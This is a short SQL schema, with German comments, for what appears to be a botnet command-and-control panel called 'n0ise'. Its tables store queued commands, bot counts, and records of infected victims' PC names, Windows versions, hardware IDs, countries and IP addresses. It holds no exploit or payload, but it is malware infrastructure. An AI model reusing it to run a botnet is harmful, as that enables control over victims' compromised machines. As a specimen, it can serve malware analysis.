CREATE TABLE IF NOT EXISTS `n0ise_tasks` (
  `taskID` int(11) NOT NULL AUTO_INCREMENT,
  `time` int(20) NOT NULL,
  `elapsed` int(20) NOT NULL,
  `command` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `bots` int(10) NOT NULL,
  PRIMARY KEY (`taskID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `n0ise_task_done`
--

CREATE TABLE IF NOT EXISTS `n0ise_task_done` (
  `taskID` int(11) NOT NULL,
  `vicID` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `n0ise_victims`
--

CREATE TABLE IF NOT EXISTS `n0ise_victims` (
  `ID` int(12) NOT NULL AUTO_INCREMENT,
  `PCName` tinytext NOT NULL,
  `BotVersion` tinytext NOT NULL,
  `InstTime` tinytext NOT NULL,
  `ConTime` tinytext NOT NULL,
  `Country` tinytext NOT NULL,
  `WinVersion` tinytext NOT NULL,
  `HWID` tinytext NOT NULL,
  `IP` tinytext NOT NULL,
  `taskID` int(11) NOT NULL,
  KEY `ID` (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;